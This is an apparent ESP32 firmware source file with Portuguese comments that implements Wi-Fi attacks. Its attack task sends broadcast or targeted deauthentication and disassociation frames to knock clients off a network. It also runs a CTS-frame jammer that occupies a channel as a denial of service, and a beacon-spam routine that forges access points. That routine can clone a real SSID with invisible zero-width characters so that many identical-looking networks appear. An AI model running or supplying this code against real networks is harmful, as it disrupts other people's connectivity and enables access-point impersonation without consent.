#include "Attacks.h"
#include "Globals.h"
#include "esp_wifi.h"

extern "C" {
#include "wsl_bypasser.h"
}

// Beacon frame deve ser 0x80 (Beacon), não 0x80,0x00
const uint8_t beacon_template[] = {
    0x80, 0x00,                         // Frame Control (Beacon frame)
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (será substituído)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (será substituído)
    0x00, 0x00,                         // Sequence Control
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                                     // Beacon interval (100ms)
    0x31, 0x04,                                     // Capability info
    // SSID IE
    0x00, // IE ID (0x00 = SSID)
    0x00, // SSID length (será substituído)
    // SSID vai aqui
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18,
    0x24,                              // Supported rates
    0x03, 0x01, 0x01,                  // DS Parameter set (canal 1)
    0x05, 0x04, 0x01, 0x02, 0x00, 0x00 // Traffic Indication Map
};

void sendBeacon(const char *ssid, uint8_t *bssid, uint8_t channel,
                uint8_t seq_num) {
  uint8_t packet[256];
  int ssid_len = strlen(ssid);
  if (ssid_len > 32)
    ssid_len = 32;

  // Copiar template base
  memcpy(packet, beacon_template, sizeof(beacon_template));

  // O SSID IE começa na posição 36 do frame:
  //   0-1   Frame Control
  //   2-3   Duration
  //   4-9   Destination (broadcast)
  //   10-15 Source MAC
  //   16-21 BSSID
  //   22-23 Sequence Control
  //   24-31 Timestamp (8 bytes)
  //   32-33 Beacon Interval
  //   34-35 Capability Info
  //   36    IE ID 0x00 (SSID)
  //   37    SSID Length
  //   38..  SSID data
  int ssid_ie_offset = 36;
  packet[ssid_ie_offset + 1] = ssid_len;               // SSID Length
  memcpy(&packet[ssid_ie_offset + 2], ssid, ssid_len); // SSID data

  // Atualizar BSSID e Source
  memcpy(&packet[10], bssid, 6); // Source
  memcpy(&packet[16], bssid, 6); // BSSID

  // Copiar os IEs fixos (rates, DS param, TIM) após o SSID
  // No template eles começam logo após o byte de SSID length (posição 39)
  // O template possui o IE do SSID na posição 36 com length=0, portanto
  // os IEs fixos no template estão em: 36 + 2 + 0 = 38
  const int fixed_ies_template_offset = 38;
  const int fixed_ies_len = sizeof(beacon_template) - fixed_ies_template_offset;
  int fixed_ies_dest = ssid_ie_offset + 2 + ssid_len;
  memcpy(&packet[fixed_ies_dest], &beacon_template[fixed_ies_template_offset],
         fixed_ies_len);

  // Atualizar canal no DS Parameter Set IE
  // DS Param IE: ID(1) + Len(1) + Channel(1) = 3 bytes
  // Está após o Supported Rates IE (10 bytes: 0x01 0x08 + 8 rates)
  int ds_channel_offset =
      fixed_ies_dest + 10 + 2; // ID(10) + Len(11) + Channel(12)
  if (ds_channel_offset < 256) {
    packet[ds_channel_offset] = channel; // define o canal correto
  }

  // Número de sequência
  packet[22] = (seq_num << 4) & 0xF0;
  packet[23] = (packet[23] & 0x0F) | ((seq_num & 0xF0) >> 4);

  // Tamanho total correto: cabeçalho 802.11 + IEs fixos do template + SSID
  int total_size = fixed_ies_dest + fixed_ies_len;

  int result = wsl_bypasser_send_raw_frame(packet, total_size);
  if (result != ESP_OK) {
    Serial.printf("Erro ao enviar beacon: %d\n", result);
  }
}

void attackTask(void *parameter) {
  Serial.println("[ATTACK_TASK] Iniciada no Core 1");

  // Seed fixo gerado UMA VEZ — garante BSSIDs estáveis entre ciclos
  // Cada slot sempre produz o mesmo BSSID → celular vê N redes fixas
  uint32_t beacon_seed = esp_random();
  int beacon_slot = 0; // slot atual dentro do pool [0 .. beaconQuantidade-1]

  while (attackTaskRunning) {

    // DEAUTHER
    if (deautherAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {

        // Verificar canal
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);

        if (canal_atual != canalTravado) {
          esp_err_t err =
              esp_wifi_set_channel(canalTravado, WIFI_SECOND_CHAN_NONE);
          if (err != ESP_OK) {
            Serial.printf("Erro ao mudar canal: %d\n", err);
          }
        }

        // deauthTipo 0 = broadcast agressivo (todos os clientes)
        // deauthTipo 1 = unicast contra cliente específico (targetClientMac)
        if (deauthTipo == 0) {
          // Broadcast simples
          wsl_bypasser_send_deauth_frame(&apRecordSelecionado);
        } else {
          // Unicast: deauth + disassoc direcionados ao cliente selecionado
          wsl_bypasser_send_deauth_frame_unicast(&apRecordSelecionado,
                                                 targetClientMac);
          wsl_bypasser_send_disassoc_frame(&apRecordSelecionado);
        }
        deauthCounter++;

        xSemaphoreGive(wifiMutex);

        vTaskDelay(pdMS_TO_TICKS(deauthTipo == 0 ? 200 : 80));
      }
    }

    // CTS JAMMER — trava o canal com ráfaga de frames Clear-To-Send
    else if (ctsAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {

        uint8_t canal_alvo =
            (canalTravado >= 1 && canalTravado <= 14) ? canalTravado : 1;
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);
        if (canal_atual != canal_alvo) {
          esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
        }

        static const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF,
                                                0xFF, 0xFF, 0xFF};

        // Envia APENAS 1 par por ciclo. Cada CTS reserva 32,7ms do canal.
        // Um delay de 25-30ms mantém o canal ocupado e, crucialmente, 
        // permite que o Driver Wi-Fi esvazie a fila de TX, evitando o Watchdog.
        wsl_bypasser_send_cts_frame(apRecordSelecionado.bssid);
        ctsCounter++;

        wsl_bypasser_send_cts_frame(broadcast_mac);
        ctsCounter++;

        xSemaphoreGive(wifiMutex);
        
        // Delay que evita saturar a fila (WDT Reset) e ao mesmo tempo mantém o DoS
        vTaskDelay(pdMS_TO_TICKS(25));
      } else {
        vTaskDelay(pdMS_TO_TICKS(10));
      }
    }

    // BEACON SPAM — N redes fixas no celular, ataque contínuo
    else if (beaconAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {

        // Canal com fallback para 1 se inválido
        uint8_t canal_alvo =
            (canalTravado >= 1 && canalTravado <= 14) ? canalTravado : 1;
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);
        if (canal_atual != canal_alvo) {
          esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
        }

        // Enviar 5 beacons por ciclo (percorre o pool em lotes)
        const int batch = 5;
        for (int i = 0; i < batch; i++) {
          int slot = (beacon_slot + i) % beaconQuantidade;

          // ── BSSID DETERMINÍSTICO por slot ──────────────────────────────
          // Usa Knuth multiplicative hash com beacon_seed fixo.
          // Mesmo slot → mesmo BSSID → rede estável no celular entre ciclos.
          uint32_t h = beacon_seed ^ ((uint32_t)(slot + 1) * 2654435761UL);
          h ^= (h >> 16);
          uint8_t fake_bssid[6];
          fake_bssid[0] = 0x02; // LAA bit (locally administered), unicast
          fake_bssid[1] = (h >> 0) & 0xFF;
          fake_bssid[2] = (h >> 8) & 0xFF;
          fake_bssid[3] = (h >> 16) & 0xFF;
          fake_bssid[4] = (h >> 24) & 0xFF;
          fake_bssid[5] = (uint8_t)slot; // índice visível — ajuda unicidade
          // ───────────────────────────────────────────────────────────────

          String fake_ssid;

          if (beaconModo == 1) {
            // MODO ALEATÓRIO: cria uma string de caracteres estável para este
            // slot
            fake_ssid = "";
            uint32_t rh =
                h; // Usa o mesmo hash do BSSID para gerar o nome aleatório
            int len = 6 + (rh % 6); // Tamanho aleatório entre 6 e 11 caracteres
            const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr"
                                  "stuvwxyz0123456789";
            for (int j = 0; j < len; j++) {
              rh = (rh * 1103515245 + 12345); // Gerador LCG simples
              fake_ssid += charset[(rh >> 16) % 62];
            }
          } else {
            // MODO CÓPIA IN-VISÍVEL (0) ou PERSONALIZADO (2)
            fake_ssid = (beaconModo == 2) ? beaconCustomSSID : ssidSelecionado;

            // ── SSID VARIÁVEL INVISÍVEL para burlar agrupamento ────────────
            // Celulares modernos (iOS/Android) agrupam redes com o nome exato.
            // Para fazer aparecerem múltiplas redes visualmente IDÊNTICAS,
            // injetamos caracteres "Zero-Width" (invisíveis) no final do SSID.
            // Usamos combinações binárias de ZWS (\xE2\x80\x8B) e ZWNJ
            // (\xE2\x80\x8C).
            if (beaconQuantidade > 1) {
              int remaining_bytes = 32 - fake_ssid.length();
              int max_bits = remaining_bytes /
                             3; // Cada char invisível usa 3 bytes (UTF-8)

              if (max_bits > 0) {
                int temp_slot = slot;
                for (int b = 0; b < max_bits; b++) {
                  if (temp_slot & 1) {
                    fake_ssid += "\xE2\x80\x8C"; // Bit 1: Zero Width Non-Joiner
                  } else {
                    fake_ssid += "\xE2\x80\x8B"; // Bit 0: Zero Width Space
                  }
                  temp_slot >>= 1;
                  if (temp_slot == 0)
                    break; // Otimização: para se não houver mais bits
                }
              }
            }
            // ───────────────────────────────────────────────────────────────
          }

          sendBeacon(fake_ssid.c_str(), fake_bssid, canal_alvo, slot & 0xFFF);
          beaconCounter++;

          vTaskDelay(pdMS_TO_TICKS(8));
        }

        // Avança o slot, reinicia ao completar o pool inteiro
        beacon_slot = (beacon_slot + batch) % beaconQuantidade;

        xSemaphoreGive(wifiMutex);
        vTaskDelay(pdMS_TO_TICKS(60));
      }
    }

    vTaskDelay(pdMS_TO_TICKS(10));
  }

  Serial.println("[ATTACK_TASK] Finalizando...");
  attackTaskHandle = NULL;
  vTaskDelete(NULL);
}
